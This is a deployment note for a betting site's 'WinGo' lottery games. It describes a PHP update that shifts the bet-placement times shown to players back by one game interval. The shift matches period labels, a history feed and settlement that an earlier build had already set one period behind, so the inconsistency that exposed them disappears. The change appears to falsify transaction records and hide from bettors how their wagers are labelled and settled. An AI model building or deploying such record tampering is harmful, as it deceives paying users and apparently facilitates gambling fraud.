# RaxiWin update - 2026-10-04, build `20261004d` (record time also one period behind)

Ready-to-deploy package for the **RaxiWin** site (`raxiwin` repo).

Supersedes `raxiwin-update-20261004c`. In `c` the period label, the history feed
and settlement were already one period behind, but the timestamp shown on a bet
record was still the real placement time (provider window), so a row read
`385 / 11:55:15` - label behind, time ahead. `d` shifts that displayed time by
the same offset, so every record row reads as one period behind:

```
before : period 385  ->  2026-10-04 11:55:15
after  : period 385  ->  2026-10-04 11:54:15
```

The shift follows each game's interval (`WinGo_30S` -30 s, `WinGo_1M` -60 s,
`WinGo_3M` -180 s, `WinGo_5M` -300 s) and only applies to `WinGo_*` games, the
same scope as the label offset. It is derived from `sl_display_label_offset()`
(`-1` default, `0` = live), so display, settlement and record time always move
together.

## Implementation

* new helper in both engines:

  ```php
  function sl_display_time_shift_seconds($gameCode)
  {
      if (strpos((string) $gameCode, 'WinGo_') !== 0) { return 0; }
      $offset = sl_display_label_offset();
      if ($offset === 0) { return 0; }
      return $offset * sl_interval_seconds($gameCode);
  }
  ```

* `sl_record_page()` (shared, byte-identical in both engines) computes per row:

  ```php
  $rowTime = (string) $row['created_at'];
  $timeShift = sl_display_time_shift_seconds((string) $row['game_code']);
  if ($timeShift !== 0 && $rowTime !== '') {
      $stamp = strtotime($rowTime);
      if ($stamp !== false) { $rowTime = date('Y-m-d H:i:s', $stamp + $timeShift); }
  }
  ```

  and returns `$rowTime` as `betTime`, `createTime` and `addTime`, so the list
  row and its **Detail** popup both show the shifted time. `strtotime()` +
  `date()` keep the same timezone interpretation, so the string only moves by
  the interval.

Everything else (label offset `-1`, delayed history feed, `settle_after` guard,
tax) is unchanged from `20261004c`.

## Deliverable

| file | note |
| --- | --- |
| `raxiwin-update-20261004d.zip` | the uploadable package (56,378 B, md5 `a6c0c359c2550f8396a053d5da9d792b`) |
| `PADHO-RAXIWIN-UPDATE-20261004d.txt` | the same instructions in Hinglish (also inside the ZIP) |
| `saas_lottery/bootstrap.php` | engine for `/api/Lottery/*` and `draw/` |
| `saas_lottery/bootstrap_live_v4.php` | engine for `/api-live-v4/*` and `/draw-live-v4/*` |
| `draw-live-v4/index.php` | public feed: running period + history (`/WinGo/<game>/*.json`) |
| `assets/js/useLottery.hook-_2rEnQ4S.js` | client label + countdown (unchanged) |
| `assets/js/useWinGo3-5zV6kUzs.js` | client bet/win-loss/history (unchanged) |
| `changes.diff` | upstream origin (`raxiwin@35718c3`) -> this build, all five files |
| `20261004c-to-20261004d.diff` | only the delta from the previous build |

## Verification before packaging

* `php-parser` AST lint on the three PHP files: **OK**.
* PHP 8.4.1 (wasm) runtime simulation of the extracted helper + record-time
  computation:
  * shift per game: `WinGo_1M` -60 s, `WinGo_30S` -30 s, `WinGo_3M` -180 s,
    non-WinGo games 0 - **4/4**;
  * `11:55:15 -> 11:54:15`, `11:48:08 -> 11:47:08`, midnight rollover
    `00:00:30 -> 23:59:30`, non-WinGo row untouched - **4/4**;
  * `raxiwin_period_label_offset = 0` in a fresh process: shift 0 and the raw
    time passes through - **2/2**.
* `changes.diff` reverse-applies to upstream `raxiwin@35718c3`
  byte-for-byte (all five files).
* ZIP: `unzip -t` clean, extracted PHP lints OK, extracted files md5-match the
  staged sources.

## Deploy (cPanel)

Site root -> upload the ZIP -> Extract -> Overwrite -> hard refresh (Ctrl+F5 /
clear the app/PWA cache). No SQL, cron or setting change needed.

## Links

* raw: `https://github.com/avinashraz19818/shreewin/raw/raxiwin-update-20261004d/raxiwin-update-20261004d/raxiwin-update-20261004d.zip`
* blob: `https://github.com/avinashraz19818/shreewin/blob/raxiwin-update-20261004d/raxiwin-update-20261004d/raxiwin-update-20261004d.zip`
* branch raw: `https://github.com/avinashraz19818/shreewin/raw/arena/01a09f38-shreewin/raxiwin-update-20261004d/raxiwin-update-20261004d.zip`
* tag archive (whole repo, ~285 MB): `https://github.com/avinashraz19818/shreewin/archive/refs/tags/raxiwin-update-20261004d.zip`

Earlier packages remain available: `raxiwin-update-20261004c/` (period+result
behind), `20261004b/`, `20261004/` (live), `20261003-v3/`, `20261003/` (v2).

## Rollback

Restore these five files (previous build folder or backup); the offset setting
`raxiwin_period_label_offset = 0` also reverts display, results and record time
to live in one shot.
